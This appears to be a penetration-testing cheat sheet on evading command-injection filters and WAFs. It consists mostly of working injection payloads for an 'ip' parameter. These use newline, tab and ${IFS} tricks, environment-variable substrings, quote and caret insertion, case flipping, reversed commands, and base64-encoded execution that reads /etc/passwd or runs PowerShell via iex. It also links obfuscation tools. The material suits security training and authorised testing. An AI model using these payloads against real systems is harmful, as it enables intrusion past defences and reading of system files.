Identify if there are any command injection filters or WAF's in place.

> [!NOTE] Note
>  If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF

### Space Filter
Use a tab (`%09`) instead of a space
```php
ip=127.0.0.1\n%09id
```
Use `${IFS}` in place of a space
```php
ip=127.0.0.1\n${IFS}id
```
Bash Brace Expansions
```php
ip=127.0.0.1\n{ls,-la}
```
### Substitute with Environment Variables
Linux
```shell
echo ${PATH:0:1}
/
ip=127.0.0.1%0a${IFS}ls${IFS}${PATH:0:1}home

echo ${LS_COLORS:10:1}
;
ip=127.0.0.1${LS_COLORS:10:1}id
```

```php
ip=127.0.0.1${LS_COLORS:10:1}${IFS}id
```
Windows
```powershell
echo %HOMEPATH:~6,-11%      <-- command prompt
\
$env:HOMEPATH[0]            <-- powershell 
\
```

### Command Filters
Use quotes Linux+Windows
```shell
w'h'o'am'i
i"d"
```
Linux only
```shell
who$@ami
w\ho\am\i
```
Window only
```powershell
who^ami
```
### Advanced Obfuscation

> [!NOTE] Note
> If there are spaces within the payload, those may need to get subbed out as well

Case manipulation - Windows
```shell
WhOaMi
```
Linux - case sensitive
```shell
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
```
Reversed commands - Linux
```shell
echo 'whoami' | rev

$(rev<<<'imaohw')
```
Windows
```powershell
"whoami"[-1..-20] -join ''

iex "$('imaohw'[-1..-20] -join '')"
```
Custom Base64 encoding - Linux -**<<< can be used to substitute |**
```shell
echo -n 'cat /etc/passwd | grep 33' | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
Windows
```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
echo -n whoami | iconv -f utf-8 -t utf-16le | base64    <--LINUX

iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
#### Evasion tools
- https://github.com/Bashfuscator/Bashfuscator
- https://github.com/danielbohannon/Invoke-DOSfuscation